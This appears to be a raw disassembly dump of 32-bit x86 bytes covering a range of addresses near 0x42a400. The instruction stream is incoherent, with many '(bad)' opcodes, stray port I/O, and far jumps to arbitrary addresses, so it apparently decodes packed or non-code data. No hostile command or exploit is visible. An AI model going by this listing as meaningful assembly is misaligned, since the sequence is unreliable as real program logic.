  42a417:	inc    esi
  42a418:	push   0x5
  42a41a:	or     BYTE PTR [ecx],dl
  42a41c:	jbe    0x42a42e
  42a41e:	je     0x42a483
  42a420:	in     eax,dx
  42a421:	cld    
  42a422:	sub    ah,ah
  42a424:	push   eax
  42a425:	mov    dl,0xc4
  42a427:	add    eax,0x210aa6c4
  42a42c:	ficomp DWORD PTR [ebp+0x5d]
  42a42f:	fmul   DWORD PTR [edx]
  42a431:	aam    0xf4
  42a433:	adc    edi,esi
  42a435:	retf   
  42a436:	lahf   
  42a437:	addr16 inc ecx
  42a439:	mov    al,ds:0xaddb1b28
  42a43e:	out    0x6b,al
  42a440:	out    0xb2,eax
  42a442:	inc    edi
  42a443:	lods   al,BYTE PTR ds:[esi]
  42a444:	mov    ah,BYTE PTR [esi+0x16da0a1]
  42a44a:	add    eax,DWORD PTR [esi]
  42a44c:	out    dx,eax
  42a44d:	mov    dh,0x3e
  42a44f:	aam    0x6d
  42a451:	arpl   WORD PTR [ebx-0x2d653943],sp
  42a457:	pop    ss
  42a458:	stos   BYTE PTR es:[edi],al
  42a459:	push   esi
  42a45a:	out    0xd4,eax
  42a45c:	inc    edx
  42a45d:	push   eax
  42a45e:	pop    es
  42a45f:	dec    eax
  42a460:	or     dl,al
  42a462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a463:	mov    cl,0xb4
  42a465:	aad    0x45
  42a467:	test   ebp,esp
  42a469:	mov    dl,0xb7
  42a46b:	enter  0x36bb,0x54
  42a46f:	mov    al,0x41
  42a471:	push   ecx
  42a472:	call   0xdd343b0f
  42a477:	mov    edx,0x8dc5d880
  42a47c:	jns    0x42a4f8
  42a47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a47f:	mov    ah,0x78
  42a481:	outs   dx,BYTE PTR ds:[esi]
  42a482:	mov    ah,0x4d
  42a484:	add    DWORD PTR [ebp-0x61],ebx
  42a487:	cwde   
  42a488:	inc    esp
  42a489:	mov    ah,0x76
  42a48b:	cwde   
  42a48c:	mov    bh,0xb6
  42a48e:	xchg   esi,eax
  42a48f:	pop    ss
  42a490:	mov    ebx,0x3afc0074
  42a495:	pop    ebx
  42a496:	pop    edi
  42a497:	add    al,0xa8
  42a499:	xchg   esp,eax
  42a49a:	push   eax
  42a49b:	fmul   st(2),st
  42a49d:	push   es
  42a49e:	mov    esp,0x321d5931
  42a4a3:	pusha  
  42a4a4:	mov    ebx,0x1d09d0b0
  42a4a9:	std    
  42a4aa:	jecxz  0x42a46d
  42a4ac:	xor    BYTE PTR [eax-0x8],al
  42a4af:	js     0x42a50e
  42a4b1:	adc    ebp,ebp
  42a4b3:	mov    BYTE PTR [edx-0x74],bl
  42a4b6:	and    eax,0xdb82ea81
  42a4bb:	(bad)  
  42a4bc:	mov    dh,0x3b
  42a4be:	mov    edi,0x16d49b46
  42a4c3:	sti    
  42a4c4:	mov    edi,esp
  42a4c6:	dec    ebp
  42a4c7:	shl    BYTE PTR [esi-0x437b31ff],1
  42a4cd:	and    esp,eax
  42a4cf:	dec    eax
  42a4d0:	xchg   edi,eax
  42a4d1:	push   eax
  42a4d2:	mov    al,0x3
  42a4d4:	xor    BYTE PTR [ebx],0x7
  42a4d7:	lahf   
  42a4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4d9:	inc    ebx
  42a4da:	aam    0xf
  42a4dc:	shl    BYTE PTR ss:[edi+0x651fe611],0xd2
  42a4e4:	mov    ds:0xbb5b6db8,al
  42a4e9:	push   0x5f303b78
  42a4ee:	hlt    
  42a4ef:	popa   
  42a4f0:	mov    dh,0xd
  42a4f2:	add    al,0x6d
  42a4f4:	mov    bl,0xf8
  42a4f6:	xchg   ebx,eax
  42a4f7:	stc    
  42a4f8:	push   ecx
  42a4f9:	scas   eax,DWORD PTR es:[edi]
  42a4fa:	cmp    BYTE PTR [ebx-0x5dc52724],0xcb
  42a501:	xchg   edx,eax
  42a502:	in     al,dx
  42a503:	dec    eax
  42a504:	aad    0xbe
  42a506:	jg     0x42a50a
  42a508:	mov    eax,0x45111535
  42a50d:	loopne 0x42a4c9
  42a50f:	div    BYTE PTR [esi+esi*4+0x60f56ad6]
  42a516:	sub    BYTE PTR [ebx-0x14],bh
  42a519:	xchg   ebp,eax
  42a51a:	mov    ch,0xd8
  42a51c:	cmp    al,BYTE PTR [eax]
  42a51e:	cs jo  0x42a568
  42a521:	xchg   ebp,eax
  42a522:	iret   
  42a523:	je     0x42a502
  42a525:	sub    dh,BYTE PTR [esi]
  42a527:	aam    0xad
  42a529:	pop    ebp
  42a52a:	xor    ecx,DWORD PTR cs:[ecx+0xe]
  42a52e:	ja     0x42a564
  42a530:	xchg   edi,eax
  42a531:	addr16 mov eax,ds:0xd146
  42a535:	shr    BYTE PTR [esi],cl
  42a537:	or     dl,al
  42a539:	outs   dx,BYTE PTR ds:[esi]
  42a53a:	push   eax
  42a53b:	clc    
  42a53c:	mov    bh,0x36
  42a53e:	sbb    dl,ah
  42a540:	push   eax
  42a541:	jmp    0x42a4e2
  42a543:	call   0xa140:0xb6d4abd
  42a54a:	xor    al,0x66
  42a54c:	aam    0xc5
  42a54e:	jle    0x42a4f2
  42a550:	test   DWORD PTR [ebp-0xd27224a],eax
  42a556:	mov    ds,WORD PTR [ecx]
  42a558:	ror    DWORD PTR [ebx],0x1a
  42a55b:	shl    BYTE PTR [esi-0x497869af],1
  42a561:	and    BYTE PTR [ebp+0x1f],ah
  42a564:	inc    ebx
  42a565:	push   ecx
  42a566:	pop    ss
  42a567:	push   ss
  42a568:	jo     0x42a581
  42a56a:	push   ss
  42a56b:	push   edi
  42a56c:	iret   
  42a56d:	jb     0x42a59d
  42a56f:	mov    ch,0xed
  42a571:	inc    edx
  42a572:	xor    BYTE PTR [edi],al
  42a574:	dec    esp
  42a575:	pop    eax
  42a576:	shl    DWORD PTR [esp+esi*2-0x52b529ef],1
  42a57d:	mov    ch,0xca
  42a57f:	(bad)  
  42a580:	imul   eax,DWORD PTR [esi-0x22735b71],0x3
  42a587:	mov    cl,0x6d
  42a589:	mov    bh,0x19
  42a58b:	pop    ss
  42a58c:	or     eax,0x509ebfc2
  42a591:	xchg   ebp,eax
  42a592:	dec    ecx
  42a593:	pop    edx
  42a594:	mov    edx,0xc8e75b6d
  42a599:	js     0x42a56c
  42a59b:	sub    ebp,ecx
  42a59d:	iret   
  42a59e:	sbb    BYTE PTR [ebx+0x1b],dl
  42a5a1:	ficom  DWORD PTR [esi+0x749720ba]
  42a5a7:	inc    ecx
  42a5a8:	imul   edi,ebx,0xffffffa4
  42a5ab:	xchg   BYTE PTR [eax+0x2de235b],al
  42a5b1:	or     cl,bl
  42a5b3:	add    BYTE PTR [ecx+0x5b],al
  42a5b6:	fwait
  42a5b7:	adc    DWORD PTR [edi+eiz*4-0x3d7dd4b9],0xb
  42a5bf:	adc    eax,0x6dbea2a5
  42a5c4:	int3   
  42a5c5:	xchg   esi,eax
  42a5c6:	outs   dx,BYTE PTR ds:[esi]
  42a5c7:	lea    ebx,ds:0x8b79e610
  42a5cd:	arpl   WORD PTR [ebp*4-0x512ae2dc],bp
  42a5d4:	cmp    BYTE PTR [esi+0x4a5be298],0xed
  42a5db:	push   edi
  42a5dc:	mov    ebx,0xc09208a0
  42a5e1:	mov    dl,0x3b
  42a5e3:	inc    edx
  42a5e4:	out    0x2f,eax
  42a5e6:	(bad)  
  42a5e7:	push   edx
  42a5e8:	mov    ebx,0xa15c47b5
  42a5ed:	inc    eax
  42a5ee:	pushf  
  42a5ef:	ja     0x42a5da
  42a5f1:	ja     0x42a62d
  42a5f3:	push   es
  42a5f4:	mov    BYTE PTR [ebx-0x17],bl
  42a5f7:	mov    cl,0xdf
  42a5f9:	pop    ecx
  42a5fa:	in     al,dx
  42a5fb:	xchg   ebp,eax
  42a5fc:	xor    ebp,DWORD PTR [ebx-0x2ea8b91b]
  42a602:	mov    ebp,DWORD PTR [edi+ebx*2]
  42a605:	scas   al,BYTE PTR es:[edi]
  42a606:	dec    ebx
  42a607:	retf   0xadc8
  42a60a:	inc    ecx
  42a60b:	mov    al,0x6d
  42a60d:	xchg   dh,ah
  42a60f:	ja     0x42a594
  42a611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a612:	add    dl,dh
  42a614:	mov    BYTE PTR [eax-0x49],ch
  42a617:	cmp    ebx,esp
  42a619:	mov    esi,0xe6ca41f0
  42a61e:	inc    esp
  42a61f:	ins    BYTE PTR es:[edi],dx
  42a620:	mov    ds:0x75626ce8,al
  42a625:	shr    DWORD PTR [ecx],cl
  42a627:	cmp    esp,DWORD PTR [edx+0x61]
  42a62a:	fstp   TBYTE PTR [ebp+0x7]
  42a62d:	jmp    DWORD PTR [edx+0x27]
  42a630:	mov    ebx,0xe6b189f1
  42a635:	fadd   DWORD PTR [eax]
  42a637:	pop    es
  42a638:	ins    DWORD PTR es:[edi],dx
  42a639:	imul   ebp,ebp,0xffffffac
  42a63c:	imul   ebp,DWORD PTR [ebx-0x27a48a10],0x3e013f87
  42a646:	ret    0x171c
  42a649:	jae    0x42a67d
  42a64b:	inc    edx
  42a64c:	imul   ebp,ebx,0xffffffb6
  42a64f:	mov    al,ds:0x7b1a569f
  42a654:	loop   0x42a6a9
  42a656:	mov    ebx,0xb4b6c8b
  42a65b:	fist   DWORD PTR [esi-0xe5c5b8c]
  42a661:	gs ret 
  42a663:	(bad)  [eax-0x16]
  42a666:	test   al,0x89
  42a668:	outs   dx,BYTE PTR ds:[esi]
  42a669:	xor    DWORD PTR [esi],0x822a3f02
  42a66f:	loop   0x42a678
  42a671:	adc    al,0x1b
  42a673:	and    BYTE PTR [edi+0xbcb28b5],0x6e
  42a67a:	mov    ah,0x5b
  42a67c:	xor    ch,BYTE PTR [ebx+0x67]
  42a67f:	push   ds
  42a680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a681:	not    BYTE PTR [eax*4+0x70b4015b]
  42a688:	mov    eax,ds:0x8fc8b557
  42a68d:	les    ebx,FWORD PTR [esi+0x76800ea2]
  42a693:	jmp    0x528659b0
  42a698:	ins    DWORD PTR es:[edi],dx
  42a699:	retf   
  42a69a:	aaa    
  42a69b:	xchg   esi,eax
  42a69c:	add    eax,0xfc2d8a
  42a6a1:	xor    eax,0xca864ec4
  42a6a6:	push   ecx
  42a6a7:	fist   DWORD PTR ds:0xd5a8efb0
  42a6ad:	repnz mov ecx,0x55752c38
  42a6b3:	sbb    ebx,DWORD PTR [ebp+0x7]
  42a6b6:	adc    al,0x49
  42a6b8:	jmp    0x885e111d
  42a6bd:	or     edi,DWORD PTR [ebp+0x37e2a001]
  42a6c3:	mov    al,0xb0
  42a6c5:	rol    BYTE PTR [eax],1
  42a6c7:	mov    cl,0x5d
  42a6c9:	(bad)  
  42a6cb:	ds push 0xddecabdc
  42a6d1:	and    BYTE PTR [edx-0x45],bl
  42a6d4:	aaa    
  42a6d5:	jnp    0x42a6d8
  42a6d7:	cmp    BYTE PTR [eax+0x2f5e9e5b],bl
  42a6dd:	push   eax
  42a6de:	sub    BYTE PTR [ebp-0x4740a3f5],0xe1
  42a6e5:	and    al,0x41
  42a6e7:	add    dl,ah
  42a6e9:	test   BYTE PTR [ebp-0xd],0x4e
  42a6ed:	mov    ebx,0x870ae400
  42a6f2:	(bad)
  42a6f6:	mov    ch,0xd
  42a6f8:	mov    al,ds:0x7d9fb603
  42a6fd:	hlt    
  42a6fe:	dec    edx
  42a6ff:	mov    ch,0x4b
  42a701:	or     ebx,DWORD PTR [ebx]
  42a703:	mov    esi,0x4d7a073c
  42a708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a709:	jno    0x42a6a3
  42a70b:	outs   dx,BYTE PTR ds:[esi]
  42a70c:	pop    ebx
  42a70d:	mov    ecx,0xfb0ba06d
  42a712:	push   es
  42a713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a714:	pop    ss
  42a715:	add    ch,BYTE PTR [esi+0x4f]
  42a718:	sub    eax,0xd0bb6da2
  42a71d:	xor    ah,ch
  42a71f:	jae    0x42a6fc
  42a721:	cwde   
  42a722:	out    dx,eax
  42a723:	sahf   
  42a724:	fild   QWORD PTR [eax+0x5b]
  42a727:	fdivr  DWORD PTR [edx]
  42a729:	lea    esp,[eax]
  42a72b:	mov    esp,0x61d21961
  42a730:	shl    DWORD PTR [ecx-0x15],0x2
  42a734:	mov    dh,0x4d
  42a736:	pop    es
  42a737:	inc    ebp
  42a738:	jb     0x42a754
  42a73a:	inc    esp
  42a73b:	pop    es
  42a73c:	rol    BYTE PTR [edx+0x326e75fb],1
  42a742:	dec    esp
  42a743:	and    BYTE PTR [edi],cl
  42a745:	sbb    BYTE PTR [esi+0x3c],dh
  42a748:	push   0x6b
  42a74a:	add    BYTE PTR [ebp-0x16],cl
  42a74d:	loopne 0x42a74d
  42a74f:	xchg   BYTE PTR [edi],ch
  42a751:	add    ah,ch
  42a753:	mov    BYTE PTR ds:0xf1c2a87e,al
  42a759:	aam    0x2d
  42a75b:	ins    BYTE PTR es:[edi],dx
  42a75c:	ins    DWORD PTR es:[edi],dx
  42a75d:	dec    ebp
  42a75e:	scas   eax,DWORD PTR es:[edi]
  42a75f:	jb     0x42a738
  42a761:	hlt    
  42a762:	idiv   DWORD PTR [esi+0x16]
  42a765:	repz fisttp QWORD PTR [edx]
  42a768:	push   ecx
  42a769:	mov    ebx,0x5357e61a
  42a76e:	scas   eax,DWORD PTR es:[edi]
  42a76f:	jge    0x42a741
  42a771:	adc    esi,DWORD PTR [esi+0x352b6170]
  42a777:	lods   eax,DWORD PTR ds:[esi]
  42a778:	dec    edi
  42a779:	stos   DWORD PTR es:[di],eax
  42a77b:	cmp    DWORD PTR [ebx-0x29],ebx
  42a77e:	xor    eax,0xb72da176
  42a783:	(bad)
  42a787:	xor    cl,BYTE PTR [edx]
  42a789:	stc    
  42a78a:	mov    ds:0xd111d8e6,al
  42a78f:	(bad)  
  42a790:	jmp    0x8514:0xcc7703ad
  42a797:	lods   eax,DWORD PTR ds:[esi]
  42a798:	in     eax,dx
  42a799:	and    BYTE PTR [esi],0xc2
  42a79c:	cdq    
  42a79d:	cmp    ebp,DWORD PTR [ebp-0x29247daf]
  42a7a3:	adc    al,dl
  42a7a5:	cdq    
  42a7a6:	xor    dl,al
  42a7a8:	int3   
  42a7a9:	je     0x42a739
  42a7ab:	aam    0x70
  42a7ad:	mov    dh,0x8d
  42a7af:	dec    ebx
  42a7b0:	or     ecx,edx
  42a7b2:	rol    DWORD PTR [esi+0x9b10426],1
  42a7b8:	loopne 0x42a7ed
  42a7ba:	ins    BYTE PTR es:[edi],dx
  42a7bb:	in     eax,dx
  42a7bc:	repnz aaa 
  42a7be:	cmp    DWORD PTR [ebx+0xf5c800],ebx
  42a7c4:	jae    0x42a82f
  42a7c6:	bound  eax,QWORD PTR [edi+0x3b]
  42a7c9:	out    dx,eax
  42a7ca:	cmp    bh,BYTE PTR [edx]
  42a7cc:	stos   BYTE PTR es:[edi],al
  42a7cd:	outs   dx,BYTE PTR ds:[esi]
  42a7ce:	xor    edi,DWORD PTR [ebp+0x92d12ae]
  42a7d4:	xchg   BYTE PTR [edi+0x45822e8d],dh
  42a7da:	xor    al,0x30
  42a7dc:	jbe    0x42a83a
  42a7de:	pop    ecx
  42a7df:	sub    eax,0x551da596
  42a7e4:	mov    BYTE PTR [edi+0x3c],0x6b
  42a7e8:	mov    esp,0xdb888616
  42a7ed:	(bad)  
  42a7ee:	adc    DWORD PTR [eax*1+0x7d0c37bc],0x70
  42a7f6:	pop    ebx
  42a7f7:	fdiv   DWORD PTR [esi-0x100916d0]
  42a7fd:	jge    0x42a869
  42a7ff:	(bad)  
  42a800:	mov    bl,0x25
  42a802:	mov    ch,0x12
  42a804:	jo     0x42a870
  42a806:	push   ebx
  42a807:	xchg   ebx,eax
  42a808:	stos   BYTE PTR es:[di],al
  42a80a:	test   BYTE PTR [edx],ah
  42a80c:	test   eax,0xc8db1ba2
  42a811:	pop    edi
  42a812:	lock jle 0x42a7ac
  42a815:	push   0x6066c205
  42a81a:	test   eax,0x96178075
  42a81f:	xor    ch,BYTE PTR [eax-0x60]
  42a822:	pop    edx
  42a823:	mov    esi,0x66dcedb5
  42a828:	sub    ebp,ebx
  42a82a:	adc    al,0xa7
  42a82c:	xchg   ebx,eax
  42a82d:	rol    DWORD PTR [eax],0x90
  42a830:	xchg   ebx,eax
  42a831:	xor    al,0x62
  42a833:	fistp  DWORD PTR [eax+0x17]
  42a836:	pop    ds
  42a837:	push   edi
  42a838:	xor    DWORD PTR [edi+0xe],eax
  42a83b:	adc    al,0x5b
  42a83d:	(bad)  [esi+0x49b6c6c]
  42a843:	jno    0x42a86d
  42a845:	outs   dx,BYTE PTR ds:[esi]
  42a846:	xchg   DWORD PTR [eax-0x74],ebx
  42a849:	mov    ah,0xd0
  42a84b:	ss mov dh,0x50
  42a84e:	mul    BYTE PTR [ebx]
  42a850:	dec    ebx
  42a851:	test   DWORD PTR [ebx+edx*1-0x2e],eax
  42a855:	rol    edx,0xad
  42a858:	push   eax
  42a859:	fwait
  42a85a:	or     BYTE PTR [ecx-0x24892c3d],al
  42a860:	(bad)  
  42a861:	(bad)  
  42a862:	inc    eax
  42a863:	nop
  42a864:	push   es
  42a865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a866:	in     al,dx
  42a867:	imul   BYTE PTR [edi+0x26]
  42a86a:	mov    ecx,0x888badb6
  42a86f:	(bad)  
  42a870:	sub    DWORD PTR [edx+0x7708e868],ebp
  42a876:	mov    edx,0x9a168a35
  42a87b:	dec    ebx
  42a87c:	cmp    BYTE PTR fs:[edx+0x29],cl
  42a880:	pusha  
  42a881:	add    eax,DWORD PTR [eax]
  42a883:	mov    edi,0xc0666a3b
  42a888:	cmp    ch,BYTE PTR [ebx+0x5d]
  42a88b:	adc    DWORD PTR [ebp+0x8],ebp
  42a88e:	loopne 0x42a817
  42a890:	sub    dl,0x36
  42a893:	push   ss
  42a894:	mov    edx,0xb6f2b608
  42a899:	dec    edx
  42a89a:	loopne 0x42a8fc
  42a89c:	add    esi,eax
  42a89e:	cs ins DWORD PTR es:[edi],dx
  42a8a0:	sbb    ebp,DWORD PTR [esi]
  42a8a2:	mov    cl,BYTE PTR [edi]
  42a8a4:	push   esp
  42a8a5:	mov    dh,0xcf
  42a8a7:	pop    ecx
  42a8a8:	jmp    0xf902:0xe8dc5525
  42a8af:	cs adc eax,0x82edadf9
  42a8b5:	mov    eax,0xb347f075
  42a8ba:	inc    eax
  42a8bb:	push   es
  42a8bc:	dec    esi
  42a8bd:	sbb    eax,0xa16babc8
  42a8c2:	mov    al,0x2f
  42a8c4:	push   0x3d
  42a8c6:	call   0x280e:0x240bb213
  42a8cd:	mov    dh,0x6d
  42a8cf:	sub    bh,0x27
  42a8d2:	pop    esp
  42a8d3:	jl     0x42a8f5
  42a8d5:	pop    ebx
  42a8d6:	pop    ss
  42a8d7:	aam    0x8d
  42a8d9:	xor    bl,dh
  42a8db:	into   
  42a8dc:	(bad)  
  42a8dd:	cmp    cl,BYTE PTR [ecx]
  42a8df:	and    al,bl
  42a8e1:	pop    eax
  42a8e2:	push   0xffffff9b
  42a8e4:	sub    BYTE PTR [eax+0x37],0xc3
  42a8e8:	loopne 0x42a925
  42a8ea:	pop    esp
  42a8eb:	or     eax,eax
  42a8ed:	add    al,0x5c
  42a8ef:	pop    eax
  42a8f0:	inc    ebx
  42a8f1:	adc    al,0x1f
  42a8f3:	ror    al,1
  42a8f5:	test   DWORD PTR [eax+edx*8],eax
  42a8f8:	ins    DWORD PTR es:[edi],dx
  42a8f9:	or     DWORD PTR [ebp+edi*4+0xb],eax
  42a8fd:	cmp    DWORD PTR [ebx+edx*2-0x3b],eax
  42a901:	add    dl,ah
  42a903:	push   edi
  42a904:	or     DWORD PTR [esi-0x1f518cbb],esi
  42a90a:	push   esi
  42a90b:	popa   
  42a90c:	arpl   di,si
  42a90e:	xchg   ecx,eax
  42a90f:	hlt    
  42a910:	(bad)  
  42a912:	lods   eax,DWORD PTR ds:[esi]
  42a913:	sub    al,0xd0
  42a915:	adc    eax,0x943549c1
  42a91a:	shr    DWORD PTR [edi+0x7c],cl
  42a91d:	mov    dh,0x26
  42a91f:	add    BYTE PTR [esi-0x64],ch
  42a922:	xor    eax,0xec23d15
  42a927:	and    al,0xa7
  42a929:	pop    ebp
  42a92a:	adc    BYTE PTR [edi],dh
  42a92c:	lea    esi,[esi+0x42]
  42a92f:	or     esp,ecx
  42a931:	shl    ebx,1
  42a933:	mov    dl,0x55
  42a935:	sub    BYTE PTR [esi-0x51befd95],dh
  42a93b:	cmp    dl,BYTE PTR [eax-0x24f491d8]
  42a941:	lock pop edi
  42a943:	sub    eax,0x83a7de40
  42a948:	push   ss
  42a949:	arpl   WORD PTR [ecx-0x5d],bp
  42a94c:	ins    DWORD PTR es:[edi],dx
  42a94d:	dec    eax
  42a94e:	mov    cl,0xd9
  42a950:	mov    edi,0xd5c84d75
  42a955:	nop
  42a956:	aaa    
  42a957:	fcmovb st,st(6)
  42a959:	ins    DWORD PTR es:[edi],dx
  42a95a:	cmp    BYTE PTR [edi-0x68],bl
  42a95d:	aaa    
  42a95e:	in     al,0xba
  42a960:	ds cdq 
  42a962:	sahf   
  42a963:	mov    bh,0xc3
  42a965:	ins    DWORD PTR es:[edi],dx
  42a966:	sub    ebx,DWORD PTR [ebx-0x6]
  42a969:	test   DWORD PTR ds:0x5998f882,eax
  42a96f:	cs je  0x42a9cd
  42a972:	sub    al,cl
  42a974:	mov    ebp,0xd14871ce
  42a979:	sti    
  42a97a:	ror    DWORD PTR [esi+0x1b153682],0xd8
  42a981:	into   
  42a982:	push   ebp
  42a983:	mov    ds:0x778236a9,al
  42a988:	int    0xd8
  42a98a:	inc    ecx
  42a98b:	mov    esi,0x5db07d42
  42a990:	rcr    bh,1
  42a992:	out    0x9b,al
  42a994:	mov    edx,0x89738ca7
  42a999:	test   esi,edx
  42a99b:	ret    0x91de
  42a99e:	lds    ecx,FWORD PTR [ecx-0x72]
  42a9a1:	sub    ch,BYTE PTR [edx-0x7d]
  42a9a4:	mov    cl,BYTE PTR ds:0x25952175
  42a9aa:	add    bh,BYTE PTR [ecx+0x6116a25a]
  42a9b0:	test   al,0x52
  42a9b2:	and    edx,DWORD PTR [edx+0x1b]
  42a9b5:	push   ebp
  42a9b6:	scas   eax,DWORD PTR es:[edi]
  42a9b7:	push   ss
  42a9b8:	add    al,0x49
  42a9ba:	mov    eax,ds:0xe23b43f6
  42a9bf:	mov    BYTE PTR [edx+0xe],0x2c
  42a9c3:	mov    cl,0x86
  42a9c5:	cdq    
  42a9c6:	push   ebx
  42a9c7:	jmp    0x42aa43
  42a9c9:	push   0xffffffbb
  42a9cb:	xor    eax,0x958b2604
  42a9d0:	lods   al,BYTE PTR ds:[esi]
  42a9d1:	cli    
  42a9d2:	dec    ebp
  42a9d3:	popa   
  42a9d4:	sub    eax,0x2138142c
  42a9d9:	std    
  42a9da:	lea    edx,[ebp+0xe]
  42a9dd:	inc    ebp
  42a9de:	in     eax,dx
  42a9df:	cmp    BYTE PTR [edx+0x15f3eb3e],0xe0
  42a9e6:	in     al,0x6d
  42a9e8:	sub    ah,BYTE PTR [eax-0x25]
  42a9eb:	(bad)  
  42a9ec:	jmp    0x136a7e1d
  42a9f1:	mov    ds:0xfe54baa1,eax
  42a9f6:	pop    ds
  42a9f7:	scas   eax,DWORD PTR es:[edi]
  42a9f8:	xor    eax,0x5c9200ce
  42a9fd:	add    BYTE PTR [eax+esi*4-0x765e403b],dh
  42aa04:	ficomp DWORD PTR [edx+0x50e6c00a]
  42aa0a:	xchg   ebx,eax
  42aa0b:	idiv   DWORD PTR [ebx+0x595b0bb5]
  42aa11:	scas   eax,DWORD PTR es:[edi]
  42aa12:	int    0x23
  42aa14:	sbb    ebp,DWORD PTR [ebp+0x4136e356]
  42aa1a:	mov    bh,0xba
  42aa1c:	call   0x59fcec67
  42aa21:	inc    edi
  42aa22:	mov    WORD PTR [ebx-0x80],ds
  42aa25:	sahf   
  42aa26:	les    eax,FWORD PTR [esi+0x3]
  42aa29:	ins    DWORD PTR es:[edi],dx
  42aa2a:	ror    DWORD PTR [esi-0x1b2ae8a1],1
  42aa30:	adc    DWORD PTR [ebp+0x0],ebp
  42aa33:	mov    eax,0x8b1a1291
  42aa38:	mov    al,ds:0x2e023a2b
  42aa3d:	jne    0x42aa23
  42aa3f:	and    BYTE PTR [ebx-0x6b],ch
  42aa42:	fmul   DWORD PTR [ecx-0x4ad393d3]
  42aa48:	stos   BYTE PTR es:[edi],al
  42aa49:	addr16 push cs
  42aa4b:	and    al,0xfc
  42aa4d:	dec    esi
  42aa4e:	shl    BYTE PTR [esi+0x7d246ed0],0xc3
  42aa55:	xchg   BYTE PTR [ebx+0x9],dh
  42aa58:	lods   eax,DWORD PTR ds:[esi]
  42aa59:	jmp    0xdf34:0x4a0162a3
  42aa60:	imul   edx,DWORD PTR [esi+0x3a],0xf0aa858a
  42aa67:	loopne 0x42aade
  42aa69:	es retf 0x4756
  42aa6d:	add    al,0x37
  42aa6f:	ss jbe 0x42aa62
  42aa72:	in     al,0x2d
  42aa74:	mov    eax,0xea7ad858
  42aa79:	fwait
  42aa7a:	lods   al,BYTE PTR ds:[esi]
  42aa7b:	ins    BYTE PTR es:[edi],dx
  42aa7c:	fstp   QWORD PTR [ebx-0x14]
  42aa7f:	jl     0x42aa3d
  42aa81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa82:	add    esi,DWORD PTR [ebx+ebx*2-0x4e]
  42aa86:	push   ecx
  42aa87:	cmp    edx,DWORD PTR [edx+0x42]
  42aa8a:	fwait
  42aa8b:	enter  0x1da,0x75
  42aa8f:	mov    DWORD PTR [ecx-0xc177503],ebp
  42aa95:	dec    esp
  42aa96:	sub    dh,BYTE PTR [esi+0x5c50ba89]
  42aa9c:	mov    ds:0x934f0945,eax
  42aaa1:	aaa    
  42aaa2:	pop    ecx
  42aaa3:	push   esi
  42aaa4:	stc    
  42aaa5:	lds    eax,FWORD PTR [ebp+0x5763c822]
  42aaab:	(bad)  
  42aaac:	loopne 0x42aab8
  42aaae:	fidiv  DWORD PTR [esi]
  42aab0:	pop    ss
  42aab1:	fcomi  st,st(5)
  42aab3:	cwde   
  42aab4:	xor    eax,0x4ab5c2a2
  42aab9:	test   BYTE PTR [ebp-0x26224f4e],ah
  42aabf:	xchg   esi,eax
  42aac0:	inc    ebx
  42aac1:	mov    edi,0x3b159725
  42aac6:	in     eax,dx
  42aac7:	mov    dh,0xf1
  42aac9:	aad    0x9f
  42aacb:	add    cl,BYTE PTR [ecx-0x46fbf383]
  42aad1:	cs pushf 
  42aad3:	lods   eax,DWORD PTR ds:[esi]
  42aad4:	lea    ebp,[ebp-0x3527ffd3]
  42aada:	pop    ss
  42aadb:	clc    
  42aadc:	shr    DWORD PTR [esi-0x2a8a4760],0x18
  42aae3:	scas   eax,DWORD PTR es:[edi]
  42aae4:	xor    DWORD PTR [edi-0x5f],edi
  42aae7:	and    al,0xb7
  42aae9:	ficom  DWORD PTR [ecx+0x70]
  42aaec:	imul   ebx,DWORD PTR [eax-0x1d],0xffffffc2
  42aaf0:	jb     0x42aad3
  42aaf2:	cdq    
  42aaf3:	loopne 0x42aa9f
  42aaf5:	ins    DWORD PTR es:[edi],dx
  42aaf6:	mov    edx,ebx
  42aaf8:	sahf   
  42aaf9:	loope  0x42aacd
  42aafb:	mov    al,0x64
  42aafd:	push   ss
  42aafe:	jb     0x42aaec
  42ab00:	ins    DWORD PTR es:[edi],dx
  42ab01:	sbb    esi,DWORD PTR [ebp+0x380da46d]
  42ab07:	dec    ebp
  42ab08:	jmp    0x6b68:0x61909ef3
  42ab0f:	stos   DWORD PTR es:[edi],eax
  42ab10:	xchg   ebp,eax
  42ab11:	ins    DWORD PTR es:[edi],dx
  42ab12:	push   eax
  42ab13:	and    al,BYTE PTR [ebx+0xb]
  42ab16:	inc    eax
  42ab17:	or     DWORD PTR [edx],ebx
  42ab19:	mov    ah,0x8a
  42ab1b:	adc    bl,BYTE PTR [eax+0x3b]
  42ab1e:	fiadd  DWORD PTR [ebp-0x4c]
  42ab21:	push   ecx
  42ab22:	pop    ss
  42ab23:	sbb    BYTE PTR [eax-0x5c92f4d2],ch
  42ab29:	in     eax,dx
  42ab2a:	sub    BYTE PTR [ecx+0x14],cl
  42ab2d:	sbb    ecx,DWORD PTR [edx-0x67]
  42ab30:	les    eax,FWORD PTR [eax-0x2eaa2b4a]
  42ab36:	sbb    BYTE PTR [edx-0x1e],ch
  42ab39:	xchg   BYTE PTR [ebx],cl
  42ab3b:	cmp    BYTE PTR ds:0xc2e081ad,dh
  42ab41:	repz push ss
  42ab43:	push   ebx
  42ab44:	in     eax,0xbf
  42ab46:	push   ecx
  42ab47:	dec    edx
  42ab48:	ins    BYTE PTR es:[edi],dx
  42ab49:	mov    bh,0xb6
  42ab4b:	(bad)  
  42ab4d:	fisub  WORD PTR [ecx-0x6574a215]
  42ab53:	sub    esp,DWORD PTR [esi]
  42ab55:	leave  
  42ab56:	push   esp
  42ab57:	shl    BYTE PTR [esi+0x7f1977b0],0x5
  42ab5e:	jge    0x42ab0d
  42ab60:	call   0x7886860d
  42ab65:	and    al,0xf9
  42ab67:	leave  
  42ab68:	jnp    0x42ab28
  42ab6a:	pop    eax
  42ab6b:	mov    eax,0x98b00e6d
  42ab70:	mov    cl,0x8b
  42ab72:	or     bl,BYTE PTR [edi+edi*8+0x6dca2ac1]
  42ab79:	(bad)  [edx-0x10]
